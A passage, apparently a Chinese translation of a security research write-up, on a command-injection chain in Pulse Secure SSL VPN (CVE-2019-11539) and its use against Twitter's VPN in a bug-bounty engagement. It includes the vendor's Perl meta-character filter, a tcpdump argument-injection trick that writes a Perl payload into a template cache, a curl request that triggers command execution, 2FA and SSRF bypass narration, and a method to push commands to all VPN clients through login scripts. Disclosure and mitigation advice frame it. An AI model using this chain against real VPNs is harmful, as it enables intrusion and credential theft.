                $rd2 = $2;
            } elsif ($arg =~ /^(1|2)?(>>?)([^>].*)?$/) {
                if ($1 and $1 == 2) {
                    ($merr, $ferr) = ($2, $3 || untaint(shift @args));
                } else {
                    ($mout, $fout) = ($2, $3 || untaint(shift @args));
                }
            } elsif ($arg =~ /^(&)(.+)?$/) {
                $fout = $ferr = $2 || untaint(shift @args);
                $mout = $merr = ">";
            } elsif ($arg =~ /^('|")(.*)('|")$/) {
                push @xargs, $2; # skip checking meta between quotes
    #               } elsif ($arg =~ /[$&*(){}[]`;|?n~<>]/) {
            } elsif ($arg =~ /[&*(){}[]`;|?n~<>]/) {
                __log("Meta characters not allowed: ($arg) $cmd");
                return undef;
            } elsif ($arg =~ /W$/) {
                __log("Meta characters not allowed: ($arg) $cmd");
            } else {
                push @xargs, untaint($arg);
            }
        }
        if ($rd2) {
            # redirect both 2 and 1 to the same place
            if (defined $fout) {
                ($ferr, $merr) = ($fout, $mout);
            } elsif (defined $ferr) {
                ($fout, $mout) = ($ferr, $merr);
            } elsif ($rd2 == 1) {
                open STDERR, ">&STDOUT" or die "cannot dup STDERR to STDOUT:$!n";
                select STDERR; $|=1;
                select STDOUT; $|=1;
            } elsif ($rd2 == 2) {
                open STDOUT, ">&STDERR" or die "cannot dup STDOUT to STDERR:$!n";
                select STDOUT; $|=1;
                select STDERR; $|=1;
            }
        }
        unless ($xcmd) {
            __log("Command parsing error: $cmd");
            return undef;
        }
        # need to untaint $cmd. otherwise the whole hash will be tainted.
        # but $cmd will never be used for exec anyway, only for debug.
        my $params = { cmd => untaint($cmd), xcmd => $xcmd, xargs => @xargs };
        $params->{fstdout} = $fout if $fout;
        $params->{mstdout} = $mout if $mout;                                
        $params->{fstderr} = $ferr if $ferr;
        $params->{mstderr} = $merr if $merr;
        $params->{fstdin} = $fin if $fin;
        $params->{mstdin} = $min if $min;
        return $params;
    }
    # ...
    sub system {
        return CORE::system(@_) if (@_ > 1);
        my $params = __parsecmd(join(' ', @_));
        return -1 unless ($params);
        # We want SIGINT and SIGQUIT to be ignored in the parent
        # while the child is running.  However, we want the child
        # to get these signals -- so we declare a block around
        # the code that ignores SIGINT such that the child will
        # exec with the signals turned on.
        {
            local $SIG{INT} = 'IGNORE';
            local $SIG{QUIT} = 'IGNORE';
            flush STDOUT; flush STDERR; flush STDIN;
            my $pid = fork;
            unless (defined $pid) {
                __log("system: cannot fork $!");
                return -1;
            }
            if ($pid) {
                waitpid $pid, 0;
                return $?;
            }
        }
        return __execo $params;
    }
从代码片段中，可以看到它替换原始system片段并进行大量__parsecmd检查，它还会阻止许多危险输入，例如：
    [&*(){}[]`;|?n~<>]
检查非常严格，因此我们无法执行任何命令注入，我们设想了几种绕过它的方法，我想到的第一件事就是参数注入。
我们列出了TCPDUMP支持的所有参数，并发现-z postrotate-command可能会有用。但令人遗憾的是，TCPDUMP只对
Pulse Secure（v3.9.4，2005年9月）支持这个功能，所以我们失败了:(
在检查系统时，我们发现虽然webroot是只读的，但可以仍然利用.Pulse
Secure缓存机制的/data/runtime/tmp/tt/缓存模板以加速脚本输出。
所以我们下一步尝试是通过-w write-file参数将文件写入模板缓存目录。但是，似乎不可能在PCAP和PCAP中编写多语言文件。
我们试图深入研究DSSFAFE.pm的实现，看看是否有任何可以利用的东西。在这里，我们在命令行解析器中发现了一个问题。如果插入不完整的I /
O重定向，则重定向部分的其余部分将被截断。虽然这是一个小小的bug，但它帮助我们重新控制了I /
O重定向！但是，无法生成有效Perl脚本的问题仍然困扰着我们。
我们被困在这里，很难生成有效的Perl脚本`STDOUT`，可以只编写Perl `STDERR`吗？确实可以，当通过`TCPDUMP` -r read-file读取不存在的文件时，它显示如下错误：
> tcpdump: [filename]: No such file or directory
看来我们可以部分地控制错误信息，然后我们尝试了文件名`print 123#`，神奇的事情发生了！
    $ tcpdump -d -r 'print 123#'
      tcpdump: print 123#: No such file or directory
    $ tcpdump -d -r 'print 123#' 2>&1 | perl –
      123
错误消息现在变为有效的Perl脚本，为什么会这样？
Perl支持GOTO标签，因此tcpdump:`成为了Perl中的有效标签，然后，用标签对其余部分进行comment，有了这个技巧，我们现在可以生成任何有效的Perl脚本！
最后，我们使用不完整的I / O符号`/data/runtime/tmp/tt/setcookie.thtml.ttc /data/runtime/tmp/tt/setcookie.thtml.ttc /dev/null
     2>&1
生成的`setcookie.thtml.ttc`内容如下：
     tcpdump: $x="ls /",system$x#: No such file or directory
现在就可以获取相应的页面来执行命令：
    $ curl https://sslvpn/dana-na/auth/setcookie.cgi
     boot  bin  home  lib64       mnt      opt  proc  sys  usr  var
     data  etc  lib   lost+found  modules  pkg  sbin  tmp 
     ...
到目前为止，这个命令注入的完整利用就结束了，但是，我们认为可能有另一种创造性的方式来利用这个漏洞，如果你找到了，请告诉我！
## 0x04 对twitter的漏洞利用实例
Pulse
Secure在2019年4月24日修补了所有漏洞，我们一直在扫描公网，以衡量每家大公司的响应时间，Twitter就是其中之一。他们的漏洞赏金奖励计划赏金很高，对白帽子黑客很友好。
但是，在补丁发布后立即利用是不合适的，所以我们等待了30天让Twitter升级他们的SSL VPN。
我们不得不说，那段时间我们很紧张，我们每天早上做的第一件事就是检查Twitter是否升级了他们的SSL VPN！对我们来说这是一个难忘的时刻。
我们在2019年5月28日开始攻击Twitter，在这次行动中，我们遇到了几个障碍。第一个是，虽然我们可以获得Twitter员工的明文密码，但由于双因素身份验证，我们仍然无法登录他们的SSL
VPN。在这里，我们建议两种方法绕过它。第一个是我们观察到Twitter使用了Duo的解决方案。该手册中提到：
>
> Duo应用程序的安全性与您的密钥（skey）的安全性有关，要像保护任何敏感凭证一样保护它。不要与未经授权的个人分享或在任何情况下通过电子邮件发送给任何人！
因此，如果我们可以从系统中提取密钥，我们可以利用Duo
API绕过2FA。但是，我们找到了绕过它的更快捷的方法。Twitter启用了漫游会话功能，该功能用于增强移动性并允许来自多个IP位置的会话。
由于这个“ 方便 ”的功能，我们可以下载会话数据库并伪造我们的cookie登录他们的系统！
到目前为止，我们可以访问Twitter
Intranet。不过，我们的目标是实现代码执行！这比仅仅访问内网更重要。所以我们想利用命令注入漏洞（CVE-2019-11539）。
在这里我们又遇到了另一个障碍，这是一个受限制的管理界面！
正如我们之前提到的，我们的障碍在于管理界面，但出于安全考虑，大多数公司都禁用此界面，因此我们需要另一种方式来访问管理页面。如果您仔细阅读了我们之前的文章，您可能会想起“
WebVPN ”功能！WebVPN是一种有助于连接到任何地方的代理。
在这里，我们使用一个小技巧来绕过SSRF保护。
通过SSRF漏洞，我们现在可以进入管理界面！然后，最后一个障碍出现了。我们没有管理员的任何明文密码。当Perl想要与本机过程交换数据时，例如C
++中的Perl扩展或Web服务器，它使用缓存来存储数据。问题是，Pulse
Secure忘记在交换后清除敏感数据，这就是我们可以在缓存中获取明文密码的原因。但实际上，大多数管理人员只是第一次登录他们的系统，所以很难获得经理的明文密码。我们唯一得到的是sha256(md5_crypt(salt,
…))格式的密码哈希
如果你破解过哈希，你会知道它有多难。所以我们推出了一个72核心的AWS来解决这个问题。  
我们破解了哈希并成功获得了RCE！我认为我们很幸运，因为根据我们的观察，Twitter员工有一个非常强大的密码保护策略。但似乎策略不适用于经理level的员工，他们的的密码长度只有十位，且第一个字符是B，它处于破解队列字符的前面，因此我们可以在3小时内破解哈希。
我们向Twitter报告了我们的所有研究成果，并从中获得了最高的赏金。虽然我们无法证明这一点，但这似乎是Twitter上的第一个远程代码执行！
## 0x05 修复建议
如何减轻此类攻击？在这里我们提出几点建议：
客户端证书。这也是最有效的方法，如果没有有效的证书，恶意连接将在SSL协商期间被删除！
多因素身份验证。虽然我们这次攻入了Twitter 2FA，但是在适当的设置下，MFA仍然可以减少攻击面
启用完整日志审核
最重要的是，始终保持您的系统更新！
## 0x06 接管所有VPN客户端
我们的公司DEVCORE在亚洲提供最专业的红队攻击服务。在这个部分，让我们谈谈如何让红队利用此漏洞！
我们知道，在红队攻击中，拿下个人电脑更有价值，有一些老方法可以通过SSL VPN破坏VPN客户端，例如更换VPN代理。
在我们的研究过程中，我们发现了一个新的攻击媒介来接管所有客户。就是“ 登录脚本 ”功能，它几乎出现在每个SSL
VPN中，例如OpenVPN，Fortinet，Pulse Secure
……等等。它可以执行相应的脚本来安装网络文件系统，或者在建立VPN连接后更改路由表。
由于这种“ 黑客友好 ”功能，一旦我们获得管理员权限，我们就可以利用此功能感染所有VPN客户端！这里以Pulse
Secure为例，演示如何不仅可以攻击SSL VPN，还可以接管所有连接的客户端：
成功拿到SSID的cookie
在浏览器替换cookie
写入执行命令
客户端连接VPN，成功命令执行
## 0x07 总结
这是攻击SSL VPN系列的最后一部分！根据我们的研究结果，SSL
VPN是一个巨大的攻击面，很少有安全研究人员深入研究这个领域，显然，它值得更多的关注。我们希望这个系列的研究可以鼓励其他研究人员参与这一领域，提高企业的安全性！
感谢我们遇到的所有人，我们将在未来发表更多有意思的研究:)